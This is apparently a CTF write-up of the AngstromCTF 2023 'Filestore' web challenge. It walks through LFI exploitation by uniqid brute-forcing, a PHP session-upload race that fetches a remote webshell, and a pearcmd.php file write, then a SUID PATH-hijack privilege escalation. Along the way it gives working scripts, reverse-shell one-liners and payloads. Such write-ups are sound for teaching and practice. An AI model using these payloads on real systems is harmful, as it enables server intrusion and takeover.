---
title: AngstromCTF 2023 Writeups for web exploitation Part 3
date: 2023-04-29 1:20:00 +/-0200
categories: [CTF writeup, Web exploitaion]
tags: [Hard, angstromctf, insecure randomness, php session upload, pearcmd.php exploit, privilege escalation, suid path exploit]
image:
  path: /assets/img/AngstromPage.png
  alt:  AngstromCTF 2023
---


Hello everyone!, here is the 3rd and last part of my writeups for the hardest challenge of angstromCTF 2023 for the web category, **Let's dive into it!**

## 8. Filestore
---

|  Difficulty  |  Point  | Downloadable files |
| :----------: |:-------:| :-----------------:|
|     10/10    |  180 pt  |      [Source code](https://files.actf.co/f9b8d6247342a994ebd07cc1374c93b7b3e49bb833066cb23928cf20a8a9e43e/filestore.tar.gz)     |

### Challange description

> Yet another PHP file storage system, [yay](https://filestore.web.actf.co/)!



### Solution 
---
Going into the website, we are greeted with the source code of the index.php!


```php
 <?php
    if($_SERVER['REQUEST_METHOD'] == "POST"){
        if ($_FILES["f"]["size"] > 1000) {
            echo "file too large";
            return;
        }
    
        $i = uniqid();

        if (empty($_FILES["f"])){
            return;
        }

        if (move_uploaded_file($_FILES["f"]["tmp_name"], "./uploads/" . $i . "_" . hash('sha256', $_FILES["f"]["name"]) . "_" . $_FILES["f"]["name"])){
            echo "upload success";
        } else {
            echo "upload error";
        }
    } else {
        if (isset($_GET["f"])) {
            include "./uploads/" . $_GET["f"];
        }

        highlight_file("index.php");

        // this doesn't work, so I'm commenting it out 😛
        // system("/list_uploads");
    }
?>
```

So this PHP script handles file uploads, when a `POST` request is made, and the file size is within 1000 byte size, the script generates a unique ID using the `uniqid()` function and moves the uploaded file to the `./uploads/`{:.filepath} directory using `move_uploaded_file()` function. Then the uploaded file is renamed to include the unique ID, the SHA256 hash of the file name, and the original file name.

When a `GET` request is made, the script checks if the `f` parameter is set in the query string. If it is set, the script includes the file located in the `./uploads/`{: .filepath} directory with the same name as the value of the `f` parameter. If the `f` parameter is not set, the script highlights the source code of the PHP file.
 
This script is screwed in multiple ways:) just looking at it we can see an **LFI** (Local File Inclusion) vulnerability (try looking at `https://filestore.web.actf.co/?f=/../../../../../etc/passwd`{: .filepath}:)

So the basic idea here is to try to gain an **RCE** (Remote Code Execution) by uploading a shell and with this LFI we access it by doing a `GET` request with the `f` parameter set to our shell name

But to do that we are faced with the fact that the script randomly renames our uploads with this `uniqid()` function!!

To bypass this there are three possible approaches:-

1. Brute-force the name of our file
2. Exploit the PHP session file upload 
3. Exploit pearcmd.php, which is preinstalled in the Docker image of the machine, to gain arbitrary file write permission and write our shell in the `/tmp`{:.filepath} folder.

#### Getting RCE
##### 1. Brute-forcing using time attack
For the first method, we should know that `uniqid()` function isn't actually _random_, that is because it depends on the time in microseconds to generate the uniqid, it's a common vulnerability to abuse the [insecure randomness](https://www.youtube.com/watch?v=WiGif0D3fIc) of those functions to be able to fuzz its output

So if we were to have a range of time before and after the scripts get an uniqid for our file, we could try and brute force the correct uniqid

Let's craft a script for it!

```php
<?php
$cfile = curl_file_create('shell.php');
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://filestore.web.actf.co/");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HEADER, true);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_POST, true); // enable posting
curl_setopt($curl, CURLOPT_POSTFIELDS, array('f' => $cfile)); 

$a = uniqid();
$resp = curl_exec($curl);
$b = uniqid();
curl_close($curl);

echo PHP_EOL.$a.PHP_EOL.$b.PHP_EOL;
echo hexdec($b)-hexdec($a);
echo PHP_EOL.$resp;
?>
```

This script uploads our _shell.php_ `<?php echo system($_GET['cmd']);` and gets a range of uniqids that our uniqid could be in it and prints the size of that range. To get a smaller range we can rerun the script a few times and use whichever range is the smallest (the second times benefits from DNS caching etc).

let's execute this script!
```bash
php uniqid.php     

644d9f4b6a272
644d9f4c493c0
913742
HTTP/1.1 200 OK
Server: nginx/1.23.3
Date: Sat, 29 Apr 2023 22:50:52 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 14
Connection: keep-alive
X-Powered-By: PHP/8.1.18

upload success% 
```

after getting our range we can generate a wordlist from it that we will use for brute-forcing the uniqid!

```python
f = open("wl.txt", "w")
start = int('644d9f4b6a272',16)
end = int('644d9f4c493c0',16)
for i in range(end,start,-1):# We generate the list backward as we expect the uniqid to be closer to the end time than the start
    f.write(str(hex(i)[2:])+"\n")

f.close()
```

We should sha256 hash our file name (_shell.php_) to craft the request as shown in the code audit.

And then ffuf to bruteforce it

```bash
ffuf -u 'https://filestore.web.actf.co/?f=FUZZ_92fc4a95a29d181d748d812e6dde0d27e5ecb28a67ee9475d11e472b01911f64_shell.php' -w wl.txt -fs 5499
```
-fs 5499 filters out results with that page size, the page has an error message for file not found so the page size will be different when we get the right id. 

Eventually, we get the id for the file after ~200k requests and can include it:

```url
https://filestore.web.actf.co/?cmd=ls -lah&f=644d9f4XXXXXX_92fc4a95a29d181d748d812e6dde0d27e5ecb28a67ee9475d11e472b01911f64_shell.php
```
__replace your own uniqid!__
So we can set up a reverse shell!

```bash
https://filestore.web.actf.co/?cmd=php%20-r%20'$sock=fsockopen(%22MYSERVERIP%22,MYSERVERPORT);exec(%22/bin/sh%20-i%20%3C&3%20%3E&3%202%3E&3%22);'&f=64445b3XXXXXX_92fc4a95a29d181d748d812e6dde0d27e5ecb28a67ee9475d11e472b01911f64_shell.php%0A

# php -r '$sock=fsockopen("MYSERVERIP",MYSERVERPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

And we got into the box!

##### 2.PHP upload session files

Ok before we start with the vulnerability one thing to be explained is that when we upload a file to a PHP script it will probably create a session file for us at least until that file is fully uploaded, this is to make sure that the file is successfully delivered

So the trick here is that since we have LFI and the ability to upload files, we can upload any file (Ex. a shell) to the server and have us read that file through the LFI, so when we do that we can create more stable shell anywhere else because the shell we upload will be cleaned when the file is done uploading, so t will be a race condition!

You can read more about this trick at this [HackTrick](https://book.hacktricks.xyz/pentesting-web/file-inclusion/via-php_session_upload_progress) article

here is a demo of when PHP will create that session file:

```bash
curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange'
ls -a /var/lib/php/sessions/
. ..
curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -d 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah'
ls -a /var/lib/php/sessions/
. ..
curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -F 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah'  -F '[email protected]/etc/passwd'
ls -a /var/lib/php/sessions/
. .. sess_iamorange
​
```
So to exploit this I will be using this script from [SloppyJoePirates](https://www.youtube.com/watch?v=fe5O1wUSkIE) to do our race condition

```python
import os
import requests

HOST = "https://filestore.web.actf.co"

def create_sess_file():
    payload = "<?php system('curl https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/php/simple-shell.php  > /tmp/webshell.php'); ?>" # RCE to make a webshell in /tmp directory because the session RCE will get deleted
    data = { 'PHP_SESSION_PROGRESS_UPLOAD':  payload }
    headers = {"Connection": 'close',"Cookie":'PHPSESSID=webshell'}
    while 1:
        fp = open('/etc/passwd','rb') # just lorem file to make the session
        print("create_sess_file")
        r = requests.post(HOST,files={'f':fp}, data=data,headers=headers)
        fp.close()


def execute_payload1():
    while True:
        print("execute_payload1")
        r = requests.get(f"{HOST}/?f=../../../../../../../tmp/sess_webshell") # Trying to access the session file that is created during the file upload


def execute_payload2():
    while True:
        print("execute payload2")
        r = requests.get(f"{HOST}/cmd?echo+'win'&f=../../../../../../../tmp/webshell.php") # confirm that execute_payload1() successfully executed our RCE and created our webshell
        if 'win' in r.text:
            print("Nice")
            os._exit(0)

import _thread


_thread.start_new_thread(create_sess_file, ())
_thread.start_new_thread(create_sess_file, ())
_thread.start_new_thread(create_sess_file, ())
_thread.start_new_thread(create_sess_file, ())
_thread.start_new_thread(create_sess_file, ())
_thread.start_new_thread(create_sess_file, ())

_thread.start_new_thread(execute_payload1, ())
_thread.start_new_thread(execute_payload1, ())
_thread.start_new_thread(execute_payload1, ())

_thread.start_new_thread(execute_payload2, ())
_thread.start_new_thread(execute_payload2, ()) # running multiple requests in multi threads to make the session and catch it to get past the race condition

while 1:
    pass

```
So I added comments to it to explain different parts but the script idea is it tries to create a session file by uploading this randomfile and while it is there it injects command to download a webshell in `/tmp`{: .filepath} and when that command gets executed we get our webshell, after we get that webshell we can either upload fully featured webshell like [monkeypentest](https://github.com/jivoi/pentest/blob/master/shell/rshell.php) one or we try to keep it as it is.

##### 3.Exploiting pearcmd.php 

As explained in this tweet from [phithon_xg](https://twitter.com/phithon_xg/status/1455534506744717323/photo/1), we can exploit the preinstalled `pearcmd.php`{: .filepath} in the official PHP Docker image to gain arbitrary file write. For instance, we can use the following command to write our payload in the _shell.php_ file located in the tmp folder:

```bash
curl "https://filestore.web.actf.co/?f=../../../../usr/local/lib/php/pearcmd.php&+-c+/tmp/shell.php+-d+man_dir=<?echo(system(\$_GET\['cmd'\]));?>+-s+"
```
Before gaining access, we need to set up a reverse shell, We can generate our payload using a website like [revshells](https://www.revshells.com/)

Now that we know we can use file inclusion to access `/tmp/shell.php`{: .filepath}, we can use the following command to trigger the reverse shell:

```bash
curl "https://filestore.web.actf.co/?f=../../../../tmp/shell.php&cmd=php%20-r%20'$sock=fsockopen(%22%3CIP%3E%22,%3CPORT%3E);system(%22sh%20%3C&3%20%3E&3%202%3E&3%22);'"
```

After triggering the reverse shell, we can see that we have successfully gained access to the machine:


#### Privilege Escalation

Now we have a shell as the ctf user, but we need to escalate our privileges to the admin user. first, we need to enumerate the box, we could use tools like [linpeas](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) to automate this process, but since this is not focused on boot2root CTF we could just look for obvious things

And indeed if we `ls / -lah` we can find some interesting stuff in the root directory

```bash
drwxr-xr-x 1 root root 4.0K Apr 26 07:46 .
drwxr-xr-x 1 root root 4.0K Apr 26 07:46 ..
d-wx-wx--x 1 root root 20K Apr 30 00:59 abyss
drwxr-xr-x 1 root root 4.0K Apr 21 18:50 bin
drwxr-xr-x 2 root root 4.0K Dec 9 19:15 boot
drwxr-xr-x 5 root root 360 Apr 26 07:46 dev
drwxr-xr-x 1 root root 4.0K Apr 26 07:46 etc
-r--r----- 1 admin admin 38 Apr 21 06:05 flag.txt
drwxr-xr-x 2 root root 4.0K Dec 9 19:15 home
drwxr-xr-x 1 root root 4.0K Apr 12 03:31 lib
drwxr-xr-x 2 root root 4.0K Apr 11 00:00 lib64 
---x--s--x 1 admin admin 894K Apr 21 08:15 list_uploads
---x--s--x 1 root root 17K Apr 21 18:11 make_abyss_entry 
drwxr-xr-x 2 root root 4.0K Apr 11 00:00 media
drwxr-xr-x 2 root root 4.0K Apr 11 00:00 mnt
drwxr-xr-x 2 root root 4.0K Apr 11 00:00 opt
dr-xr-xr-x 381 root root 0 Apr 26 07:46 proc
drwx------ 1 root root 4.0K Apr 14 18:16 root
drwxr-xr-x 1 root root 4.0K Apr 12 03:34 run 
drwxr-xr-x 1 root root 4.0K Apr 12 03:34 sbin
drwxr-xr-x 2 root root 4.0K Apr 11 00:00 srv
dr-xr-xr-x 13 root root 0 Apr 22 20:03 sys 
drwxrwxrwt 1 root root 4.0K Apr 30 00:13 tmp
drwxr-xr-x 1 root root 4.0K Apr 11 00:00 usr 
drwxr-xr-x 1 root root 4.0K Apr 12 03:31 var
drwxr-xr-x 1 root root 4.0K Apr 12 03:31 var

```
Sure there are some interesting files here!

The first file is the `flag.txt` but looking at its permission it is only readable by admin

The second one is `make_abyss_entry`, binary, this creates a folder in `/abyss/`{: .filepath} so we can write files without other players from the CTF reading or interfering with them

The last one is the binary `list_uploads`, which only has executing permissions, but it is a **SUID** (setuid) permission as the admin user! So, if we can somehow exploit this, we can get permission as the admin user.

Because the uploads folder is owned by root and it only has WX permissions, the list_uploads program can’t view the contents of the folder. That’s also the reason for the comment in the _index.php_ file

Using ghidra we can decompile the `list_uploads` binary to understand how it works. let's look at it!

```c
void main(void)
{
    __gid_t __rgid;

    setbuf((FILE *)_IO_2_1_stdout_,(char *)0x0);
    setbuf((FILE *)_IO_2_1_stdin_,(char *)0x0);
    __rgid = getegid();
    setresgid(__rgid,__rgid,__rgid);
    system('ls /var/www/html/uploads');
    return;
}
```
In this case, we found that the binary is using the `system()` function to call the ls function, the mistake with this binary is that the full path for `ls` is not specified. This is a security issue for programs with SUID because it means that it will rely on the `$PATH` variable to determine where the `ls` binary is and will run it with elevated privileges, this means if we were able to alter the `$PATH` variable we can make it execute our own `ls` binary!

But since chmod and chown are deleted from the box, we can't make our `ls` binary executable on that box, but there is a way around it! we can craft our binary on our machine and send it over to our folder in the `/abyss/`{: .filepath}, or we could use any programming language that uses the chmod  

here is an example in C language: 

```bash
echo int main(int argc, char **argv) {system("/bin/bash -p");} > ls.c
gcc ls.c -o ls
PATH=/abyss/your_abyss_folder/:$PATH  /list_uploads
```
and if we did the `ID` command we can indeed see that we are admin user!

```bash
id
uid=998(ctf) gid=999(admin) groups=999(admin)
/bin/cat /flag.txt
actf{w4tch_y0ur_p4th_724248b559281824}
```

Another one using PHP:

```bash
echo '/bin/cat /flag.txt' > /abyss/your_abyss_folder/ls
echo "<? php chmod('/abyss/your_abyss_folder/ls',0777); ?>" > /abyss/your_abyss_folder/chmod.php
php /abyss/your_abyss_folder/chmod.php
PATH=/abyss/your_abyss_folder/ls PWD=/abyss/your_abyss_folder/ /list_uploads
'actf{w4tch_y0ur_p4th_724248b559281824}'
```

#### Learned: `LFI`, `Upload Vulnablity`, `Insecure Randomness`, `PHP Session Upload`, `Pearcmd.php Exploit`, `Privlige Esclation`, `SUID PATH exploit`
---

**So this was my first time writing writeups, what do you think of it? if you noticed any mistake or misinformation please comment below so I know of it! or you can contact me through my links, thank you for reading and I hope to see you in new CTFs!!**
